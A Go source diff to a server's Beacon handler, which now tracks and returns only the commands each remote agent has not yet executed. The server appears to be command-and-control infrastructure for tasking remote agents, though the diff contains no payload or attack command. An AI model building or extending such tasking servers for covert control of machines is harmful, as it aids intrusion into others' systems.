@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 
 	"server/database"
+	"server/helpers"
 )
 
 // Retrieve commands from database (POST)
@@ -38,11 +39,28 @@ func Beacon(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Return data in response
+	// Filter commands that have already been executed
+	unexecuted_commands := make([]database.Command, 0, 20)
+	agent_executed_commands_list, err := database.GetAgentCommandsList(request.UID) // Get list of executed commands' uid's
+	if err != nil {
+		http.Error(w, "Couldn't retrieve agent's executed commands list", http.StatusInternalServerError)
+		return
+	}
+
+	for _, command := range commands {
+		already_executed := helpers.Contains(agent_executed_commands_list, command.Uid) // Check if command has already been executed
+
+		if !already_executed {
+			database.AddToAgentExecutedCommandsList(request.UID, command.Uid)
+			unexecuted_commands = append(unexecuted_commands, command)
+		}
+	}
+
+	// Return commands that agent has not executed
 	response := struct {
 		Commands   []database.Command  `json:"commands"`
 	}{
-		Commands:  commands,
+		Commands:  unexecuted_commands,
 	}
 
 	w.Header().Set("Content-Type", "application/json")
